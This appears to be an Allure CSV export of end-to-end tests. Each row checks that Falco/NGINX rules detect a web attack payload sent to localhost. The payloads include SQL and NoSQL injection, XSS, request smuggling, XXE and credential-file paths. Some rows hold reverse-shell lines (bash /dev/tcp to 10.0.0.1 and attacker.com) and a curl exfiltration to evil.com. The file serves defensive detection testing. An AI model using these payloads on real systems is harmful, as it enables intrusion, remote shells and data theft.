"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ABS_006` |
| **Name** | Apache site configuration access |
| **Category** | PATH |
| **Subcategory** | absolute_paths |
| **Severity** | `MEDIUM` |

## Attack Details

- **Payload**: `/etc/apache2/sites-available/000-default.conf`
- **Encoded**: `%2Fetc%2Fapache2%2Fsites-available%2F000-default.conf`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~64000ms
- **Timestamp**: 15:06:28.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] File inclusion attack detected` |
| **Matched Rule** | `[NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_006-1770995188870-qj94pl pattern_id=PATH_ABS_006 uri=/?q=%2Fetc%2Fapache2%2Fsites-available%2F000-default.conf client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_006-1770995188870-qj94pl pattern_id=PATH_ABS_006 uri=/?q=%2Fetc%2Fapache2%2Fsites-available%2F000-default.conf client=127.0.0.1

**Falco Log Entry**:
```
15:06:28.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_006-1770995188870-qj94pl pattern_id=PATH_ABS_006 uri=/?q=%2Fetc%2Fapache2%2Fsites-available%2F000-default.conf client=127.0.0.1
```","2","test_e2e_with_logs[216_PATH_ABS_006]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_ADV_087` |
| **Name** | UPDATE SET Injection |
| **Category** | SQLI |
| **Subcategory** | advanced |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `UPDATE users SET role='admin'`
- **Encoded**: `UPDATE%20users%20SET%20role%3D%27admin%27`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~44000ms
- **Timestamp**: 15:06:48.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt` |
| **Matched Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_ADV_087-1770995208449-hlomdd pattern_id=SQLI_ADV_087 uri=/?q=UPDATE%20users%20SET%20role%3D%27admin%27 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_ADV_087-1770995208449-hlomdd pattern_id=SQLI_ADV_087 uri=/?q=UPDATE%20users%20SET%20role%3D%27admin%27 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
15:06:48.000000000: Warning [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_ADV_087-1770995208449-hlomdd pattern_id=SQLI_ADV_087 uri=/?q=UPDATE%20users%20SET%20role%3D%27admin%27 client=127.0.0.1 method=GET
```","3","test_e2e_with_logs[013_SQLI_ADV_087]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_ADV_065` |
| **Name** | Curl Exfiltration |
| **Category** | CMDINJ |
| **Subcategory** | advanced |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `curl http://evil.com/$(whoami)`
- **Encoded**: `curl%20http%3A%2F%2Fevil.com%2F%24%28whoami%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~40000ms
- **Timestamp**: 15:06:52.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command substitution attack` |
| **Matched Rule** | `[NGINX CMDi] Command substitution attack test_id=CMD_ADV_065-1770995212420-896pf pattern_id=CMD_ADV_065 uri=/?q=curl%20http%3A%2F%2Fevil.com%2F%24%28whoami%29 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command substitution attack test_id=CMD_ADV_065-1770995212420-896pf pattern_id=CMD_ADV_065 uri=/?q=curl%20http%3A%2F%2Fevil.com%2F%24%28whoami%29 client=127.0.0.1

**Falco Log Entry**:
```
15:06:52.000000000: Critical [NGINX CMDi] Command substitution attack test_id=CMD_ADV_065-1770995212420-896pf pattern_id=CMD_ADV_065 uri=/?q=curl%20http%3A%2F%2Fevil.com%2F%24%28whoami%29 client=127.0.0.1
```","2","test_e2e_with_logs[293_CMD_ADV_065]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `HRS_HEADER_002` |
| **Name** | Double Content-Length |
| **Category** | HTTP_SMUGGLING |
| **Subcategory** | header_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `Content-Length: 10
Content-Length: 0`
- **Encoded**: `Content-Length%3A%2010%0D%0AContent-Length%3A%200`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~14000ms
- **Timestamp**: 15:07:18.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX HRS] HTTP Request Smuggling attempt` |
| **Matched Rule** | `[NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_HEADER_002-1770995238846-zx350s pattern_id=HRS_HEADER_002 uri=/?q=Content-Length%3A%2010%0D%0AContent-Length%3A%200 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_HEADER_002-1770995238846-zx350s pattern_id=HRS_HEADER_002 uri=/?q=Content-Length%3A%2010%0D%0AContent-Length%3A%200 client=127.0.0.1

**Falco Log Entry**:
```
15:07:18.000000000: Critical [NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_HEADER_002-1770995238846-zx350s pattern_id=HRS_HEADER_002 uri=/?q=Content-Length%3A%2010%0D%0AContent-Length%3A%200 client=127.0.0.1
```","2","test_e2e_with_logs[487_HRS_HEADER_002]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_ADV_065` |
| **Name** | JavaScript Protocol Handler |
| **Category** | XSS |
| **Subcategory** | advanced |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `javascript:alert(1)`
- **Encoded**: `javascript%3Aalert%281%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~50000ms
- **Timestamp**: 15:06:42.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_065-1770995202409-0jhvwu pattern_id=XSS_ADV_065 uri=/?q=javascript%3Aalert%281%29 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_065-1770995202409-0jhvwu pattern_id=XSS_ADV_065 uri=/?q=javascript%3Aalert%281%29 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
15:06:42.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_065-1770995202409-0jhvwu pattern_id=XSS_ADV_065 uri=/?q=javascript%3Aalert%281%29 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[133_XSS_ADV_065]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_POLY_006` |
| **Name** | Polyglot onload img |
| **Category** | XSS |
| **Subcategory** | polyglot |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `'/><img src=x onerror=alert(1) /><input type='hidden' value='`
- **Encoded**: `'%2F%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%20%2F%3E%3Cinput%20type%3D'hidden'%20value%3D'`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~55000ms
- **Timestamp**: 15:06:37.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_POLY_006-1770995197398-ii1r8q pattern_id=XSS_POLY_006 uri=/?q='%2F%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%20%2F%3E%3Cinput%20type%3D'hidden'%20value%3D' client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_POLY_006-1770995197398-ii1r8q pattern_id=XSS_POLY_006 uri=/?q='%2F%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%20%2F%3E%3Cinput%20type%3D'hidden'%20value%3D' client=127.0.0.1 method=GET

**Falco Log Entry**:
```
15:06:37.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_POLY_006-1770995197398-ii1r8q pattern_id=XSS_POLY_006 uri=/?q='%2F%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%20%2F%3E%3Cinput%20type%3D'hidden'%20value%3D' client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[186_XSS_POLY_006]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ABS_005` |
| **Name** | Process environment variables access |
| **Category** | PATH |
| **Subcategory** | absolute_paths |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `/proc/self/environ`
- **Encoded**: `/proc/self/environ`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~68000ms
- **Timestamp**: 15:06:24.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] File inclusion attack detected` |
| **Matched Rule** | `[NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_005-1770995184861-qlcq2m pattern_id=PATH_ABS_005 uri=/?q=/proc/self/environ client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_005-1770995184861-qlcq2m pattern_id=PATH_ABS_005 uri=/?q=/proc/self/environ client=127.0.0.1

**Falco Log Entry**:
```
15:06:24.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_005-1770995184861-qlcq2m pattern_id=PATH_ABS_005 uri=/?q=/proc/self/environ client=127.0.0.1
```","1","test_e2e_with_logs[215_PATH_ABS_005]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `EMRG_MONGO_003` |
| **Name** | MongoDB greater-than bypass |
| **Category** | OTHER |
| **Subcategory** | mongodb_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `{""$gt"": """"}`
- **Encoded**: `%7B%22%24gt%22%3A%20%22%22%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~66000ms
- **Timestamp**: 15:06:26.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection` |
| **Matched Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_003-1770995186340-bvhb1v pattern_id=EMRG_MONGO_003 uri=/?q=%7B%22%24gt%22%3A%20%22%22%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_003-1770995186340-bvhb1v pattern_id=EMRG_MONGO_003 uri=/?q=%7B%22%24gt%22%3A%20%22%22%7D client=127.0.0.1

**Falco Log Entry**:
```
15:06:26.000000000: Critical [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_003-1770995186340-bvhb1v pattern_id=EMRG_MONGO_003 uri=/?q=%7B%22%24gt%22%3A%20%22%22%7D client=127.0.0.1
```","1","test_e2e_with_logs[524_EMRG_MONGO_003]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `HRS_TE_CL_002` |
| **Name** | TE.CL with Zero Chunk |
| **Category** | HTTP_SMUGGLING |
| **Subcategory** | te_cl |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `0

SMUGGLED`
- **Encoded**: `0%0D%0A%0D%0ASMUGGLED`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~16000ms
- **Timestamp**: 15:07:16.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX HRS] HTTP Request Smuggling attempt` |
| **Matched Rule** | `[NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_TE_CL_002-1770995236841-mfd8r4 pattern_id=HRS_TE_CL_002 uri=/?q=0%0D%0A%0D%0ASMUGGLED client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_TE_CL_002-1770995236841-mfd8r4 pattern_id=HRS_TE_CL_002 uri=/?q=0%0D%0A%0D%0ASMUGGLED client=127.0.0.1

**Falco Log Entry**:
```
15:07:16.000000000: Critical [NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_TE_CL_002-1770995236841-mfd8r4 pattern_id=HRS_TE_CL_002 uri=/?q=0%0D%0A%0D%0ASMUGGLED client=127.0.0.1
```","2","test_e2e_with_logs[571_HRS_TE_CL_002]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_REVSH_001` |
| **Name** | Bash reverse shell |
| **Category** | CMDINJ |
| **Subcategory** | reverse_shell |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`
- **Encoded**: `bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.1%2F4444%200%3E%261`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~52000ms
- **Timestamp**: 15:06:40.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_001-1770995200388-vwzr5k pattern_id=CMD_REVSH_001 uri=/?q=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.1%2F4444%200%3E%261 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_001-1770995200388-vwzr5k pattern_id=CMD_REVSH_001 uri=/?q=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.1%2F4444%200%3E%261 client=127.0.0.1

**Falco Log Entry**:
```
15:06:40.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_001-1770995200388-vwzr5k pattern_id=CMD_REVSH_001 uri=/?q=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.1%2F4444%200%3E%261 client=127.0.0.1
```","1","test_e2e_with_logs[364_CMD_REVSH_001]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASH_004` |
| **Name** | Bash TCP shell via exec |
| **Category** | CMDI |
| **Subcategory** | bash_specific |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `; exec 5<>/dev/tcp/attacker.com/4444;cat <&5 | while read line; do $line 2>&5 >&5; done`
- **Encoded**: `%3B%20exec%205%3C%3E%2Fdev%2Ftcp%2Fattacker.com%2F4444%3Bcat%20%3C%265%20%7C%20while%20read%20line%3B%20do%20%24line%202%3E%265%20%3E%265%3B%20done`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~36000ms
- **Timestamp**: 15:06:56.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via semicolon` |
| **Matched Rule** | `[NGINX CMDi] Command injection via semicolon test_id=CMD_BASH_004-1770995216931-1wmck6 pattern_id=CMD_BASH_004 uri=/?q=%3B%20exec%205%3C%3E%2Fdev%2Ftcp%2Fattacker.com%2F4444%3Bcat%20%3C%265%20%7C%20while%20read%20line%3B%20do%20%24line%202%3E%265%20%3E%265%3B%20done client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via semicolon test_id=CMD_BASH_004-1770995216931-1wmck6 pattern_id=CMD_BASH_004 uri=/?q=%3B%20exec%205%3C%3E%2Fdev%2Ftcp%2Fattacker.com%2F4444%3Bcat%20%3C%265%20%7C%20while%20read%20line%3B%20do%20%24line%202%3E%265%20%3E%265%3B%20done client=127.0.0.1

**Falco Log Entry**:
```
15:06:56.000000000: Critical [NGINX CMDi] Command injection via semicolon test_id=CMD_BASH_004-1770995216931-1wmck6 pattern_id=CMD_BASH_004 uri=/?q=%3B%20exec%205%3C%3E%2Fdev%2Ftcp%2Fattacker.com%2F4444%3Bcat%20%3C%265%20%7C%20while%20read%20line%3B%20do%20%24line%202%3E%265%20%3E%265%3B%20done client=127.0.0.1
```","2","test_e2e_with_logs[304_CMD_BASH_004]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `API_BOLA_003` |
| **Name** | BOLA Admin User Profile Access |
| **Category** | API_SECURITY |
| **Subcategory** | bola |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `/api/admin/users/100/profile`
- **Encoded**: `%2Fapi%2Fadmin%2Fusers%2F100%2Fprofile`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~27000ms
- **Timestamp**: 15:07:05.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX API Attack] API security vulnerability detected` |
| **Matched Rule** | `[NGINX API Attack] API security vulnerability detected test_id=API_BOLA_003-1770995225850-8wwkxz pattern_id=API_BOLA_003 uri=/?q=%2Fapi%2Fadmin%2Fusers%2F100%2Fprofile client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX API Attack] API security vulnerability detected test_id=API_BOLA_003-1770995225850-8wwkxz pattern_id=API_BOLA_003 uri=/?q=%2Fapi%2Fadmin%2Fusers%2F100%2Fprofile client=127.0.0.1

**Falco Log Entry**:
```
15:07:05.000000000: Warning [NGINX API Attack] API security vulnerability detected test_id=API_BOLA_003-1770995225850-8wwkxz pattern_id=API_BOLA_003 uri=/?q=%2Fapi%2Fadmin%2Fusers%2F100%2Fprofile client=127.0.0.1
```","2","test_e2e_with_logs[406_API_BOLA_003]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_OBF_005` |
| **Name** | Brace Expansion Bypass |
| **Category** | CMDINJ |
| **Subcategory** | obfuscation |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `;{cat,/etc/passwd}`
- **Encoded**: `%3B%7Bcat%2C%2Fetc%2Fpasswd%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~31000ms
- **Timestamp**: 15:07:01.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] File inclusion attack detected` |
| **Matched Rule** | `[NGINX Traversal] File inclusion attack detected test_id=CMD_OBF_005-1770995221944-lu37tb pattern_id=CMD_OBF_005 uri=/?q=%3B%7Bcat%2C%2Fetc%2Fpasswd%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=CMD_OBF_005-1770995221944-lu37tb pattern_id=CMD_OBF_005 uri=/?q=%3B%7Bcat%2C%2Fetc%2Fpasswd%7D client=127.0.0.1

**Falco Log Entry**:
```
15:07:01.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=CMD_OBF_005-1770995221944-lu37tb pattern_id=CMD_OBF_005 uri=/?q=%3B%7Bcat%2C%2Fetc%2Fpasswd%7D client=127.0.0.1
```","2","test_e2e_with_logs[350_CMD_OBF_005]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XXE_ENTITY_005` |
| **Name** | XXE data URI scheme injection |
| **Category** | XXE |
| **Subcategory** | entity_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<!ENTITY xxe SYSTEM ""data:text/plain;base64,dGVzdA=="">`
- **Encoded**: `%3C!ENTITY%20xxe%20SYSTEM%20%22data%3Atext%2Fplain%3Bbase64%2CdGVzdA%3D%3D%22%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~55000ms
- **Timestamp**: 15:06:37.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection` |
| **Matched Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_005-1770995197344-q3qg1r pattern_id=XXE_ENTITY_005 uri=/?q=%3C!ENTITY%20xxe%20SYSTEM%20%22data%3Atext%2Fplain%3Bbase64%2CdGVzdA%3D%3D%22%3E client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_005-1770995197344-q3qg1r pattern_id=XXE_ENTITY_005 uri=/?q=%3C!ENTITY%20xxe%20SYSTEM%20%22data%3Atext%2Fplain%3Bbase64%2CdGVzdA%3D%3D%22%3E client=127.0.0.1

**Falco Log Entry**:
```
15:06:37.000000000: Critical [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_005-1770995197344-q3qg1r pattern_id=XXE_ENTITY_005 uri=/?q=%3C!ENTITY%20xxe%20SYSTEM%20%22data%3Atext%2Fplain%3Bbase64%2CdGVzdA%3D%3D%22%3E client=127.0.0.1
```","2","test_e2e_with_logs[473_XXE_ENTITY_005]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
